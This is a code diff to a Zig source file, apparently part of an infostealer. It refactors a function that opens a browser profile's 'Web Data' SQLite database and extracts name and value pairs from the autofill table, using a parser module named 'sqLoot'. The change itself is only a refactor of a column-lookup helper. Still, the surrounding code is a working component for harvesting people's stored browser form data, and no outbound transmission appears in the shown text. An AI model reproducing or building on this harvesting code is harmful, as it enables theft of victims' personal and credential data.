@@ -2,18 +2,6 @@ const std = @import("std");
 const sqLoot = @import("../parsers/sqLoot.zig");
 const file_io = @import("../parsers/file_io.zig");
 
-fn columnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
-    const cols = db.getColumnNames(table) catch return null;
-    defer {
-        for (cols) |c| allocator.free(c);
-        allocator.free(cols);
-    }
-    for (cols, 0..) |col, i| {
-        if (std.mem.eql(u8, col, name)) return i;
-    }
-    return null;
-}
-
 pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator) ?[][]const u8 {
     const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Web Data" }) catch return null;
     defer allocator.free(db_path);
@@ -27,8 +15,13 @@ pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator) ?[][]
     const rows = db.readTable("autofill") catch return null;
     defer allocator.free(rows);
 
-    const name_idx = columnIndex(&db, "autofill", "name", allocator) orelse return null;
-    const value_idx = columnIndex(&db, "autofill", "value", allocator) orelse return null;
+    const cols = db.getColumnNames("autofill") catch return null;
+    defer {
+        for (cols) |c| allocator.free(c);
+        allocator.free(cols);
+    }
+    const name_idx = sqLoot.findColumnIndex(cols, "name") orelse return null;
+    const value_idx = sqLoot.findColumnIndex(cols, "value") orelse return null;
 
     var list = std.ArrayList([]const u8).init(allocator);
     errdefer {
